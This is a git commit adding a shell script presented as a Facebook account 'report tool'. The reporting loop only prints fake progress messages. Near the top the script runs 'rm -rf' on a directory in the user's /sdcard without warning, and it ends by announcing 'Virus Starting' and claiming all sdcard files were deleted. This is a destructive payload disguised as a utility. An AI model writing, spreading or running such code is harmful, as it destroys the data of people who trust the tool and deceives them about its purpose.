f0228a297b425e424b57ad3299691f3957b29a8b
maxpro-boop <79564419+maxpro-boop@users.noreply.github.com>
2021-02-24 13:17:07 +0630

    Add files via upload

---
+++ fbreport.sh
@@ -0,0 +1,19 @@
+clear
+figlet -f standard FB report Tool
+cd /sdcard
+rm -rf New
+echo ""
+echo -e "\e[1;31m Author:Han Gyi \e[0m"
+echo -e "Github:https://github.com/hangyi00789"
+echo -e "\e[1;37m Facebook acc report tool for normal user \e[0m"
+echo ""
+read -p "Target id::" id
+echo ""
+for x in {1..1000};do
+echo -e "\e[1;35m $id reporting........ \e[0m"
+echo -e "\e[1;32m ==================================== \e[0m"
+done
+echo -e "\e[1;31m Waiting..... \e[0m"
+clear
+figlet -f standard Virus Starting
+echo -e "\e[1;37m We deleted  All File in Your Sdcard \e[0m"
